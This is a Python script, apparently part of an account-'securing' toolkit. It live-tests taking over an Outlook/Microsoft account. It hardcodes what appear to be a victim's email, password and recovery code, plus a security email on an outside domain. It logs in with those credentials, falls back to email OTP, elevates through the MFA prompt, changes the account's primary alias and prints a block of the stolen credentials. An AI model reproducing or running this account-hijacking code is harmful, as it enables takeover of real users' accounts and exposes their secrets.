#!/usr/bin/env python3
"""Live-test Names MFA fail-fast + primary alias on rylanrawicki."""
from __future__ import annotations

import asyncio
import logging
import sys
import time
import uuid
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
logging.basicConfig(level=logging.INFO, format="%(levelname)s %(name)s: %(message)s")

from database.database import DBConnection
from securing.auth.get_msaauth import get_msaauth
from securing.auth.handle_redirects import get_data, handle_redirects
from securing.auth.initial_session import get_session
from securing.auth.polish_host import polish_host
from securing.auth.send_auth import send_auth
from securing.utils.cookies.get_cookies import get_cookies
from securing.utils.cookies.get_email_code import get_email_code
from securing.utils.cookies.get_livedata import livedata
from securing.utils.cookies.safe_cookies import has_cookie
from securing.utils.login_pwd import login_pwd
from securing.utils.proxy import close_session
from securing.utils.security.change_primary_alias import (
    _elevate_for_names_manage,
    _get_manage,
    change_primary_alias,
)
from securing.utils.security_information import _page_id

EMAIL = "rylanrawicki@outlook.com"
PWD = "E9Y9lWeekgFtKF"
SEC = "8f0baa8b28764b10@ilovevbucks.site"
RC = "MJEPN-2E5WB-4ECWL-2QKFT-C59MS"


async def main() -> None:
    with DBConnection() as db:
        try:
            db.add_security_email(SEC, PWD)
        except Exception as e:
            print("sec email", e)

    session = get_session()
    t0 = time.monotonic()
    try:
        # Prefer password login (verified OK on last secure)
        live = await livedata(session)
        page = await login_pwd(session, EMAIL, live["urlPost"], PWD, live["ppft"])
        msa = get_data(page)
        if not msa:
            h = await handle_redirects(session, page)
            msa = h if isinstance(h, dict) else get_data(h if isinstance(h, str) else page)
        if not msa or not msa.get("urlPost"):
            if has_cookie(session, "__Host-MSAAUTH") or has_cookie(session, "MSPAuth"):
                msa = {"_cookies_only": True}
            else:
                print("password login failed — OTP fallback")
                info = await send_auth(session, EMAIL, SEC)
                proofs = (
                    ((info.get("response") or {}).get("Credentials") or {}).get(
                        "OtcLoginEligibleProofs"
                    )
                    or []
                )
                if not proofs:
                    print("no proofs", info)
                    return
                code = await get_email_code(SEC, timeout=120)
                print("OTP", code)
                if not code:
                    return
                live = await livedata(session)
                msa = await get_msaauth(
                    session,
                    EMAIL,
                    proofs[0]["data"],
                    {
                        "urlPost": live["urlPost"],
                        "ppft": info.get("ppft") or live["ppft"],
                    },
                    code,
                )
                if isinstance(msa, str):
                    h = await handle_redirects(session, msa)
                    msa = h if isinstance(h, dict) else get_data(msa)

        await polish_host(session, msa if isinstance(msa, dict) else {"_cookies_only": True})
        print("logged in", time.monotonic() - t0)

        html, canary, emails = await _get_manage(session)
        print("manage pre", _page_id(html), bool(canary), emails[:6])

        if not canary:
            t_mfa = time.monotonic()
            html, canary, emails = await _elevate_for_names_manage(
                session,
                html,
                security_email=SEC,
                account_email=EMAIL,
                password=PWD,
            )
            print(
                f"elevate done in {time.monotonic()-t_mfa:.1f}s "
                f"canary={bool(canary)} page={_page_id(html)} emails={emails[:6]}"
            )

        api = await get_cookies(session)
        local = f"sunny{uuid.uuid4().hex[:12]}"
        t_p = time.monotonic()
        ok = await change_primary_alias(
            session,
            local,
            api,
            security_email=SEC,
            account_email=EMAIL,
            password=PWD,
        )
        _, _, after = await _get_manage(session)
        print(f"PRIMARY_OK={ok} in {time.monotonic()-t_p:.1f}s local={local}")
        print("after aliases", after)
        print(f"TOTAL {time.monotonic()-t0:.1f}s")
        print("\n=== CREDENTIALS ===")
        print("original:", EMAIL)
        print("primary:", f"{local}@outlook.com" if ok else EMAIL)
        print("security:", SEC)
        print("password:", PWD)
        print("recovery:", RC)
        print("mc: TFORCE888")
    finally:
        await close_session(session)


if __name__ == "__main__":
    asyncio.run(main())
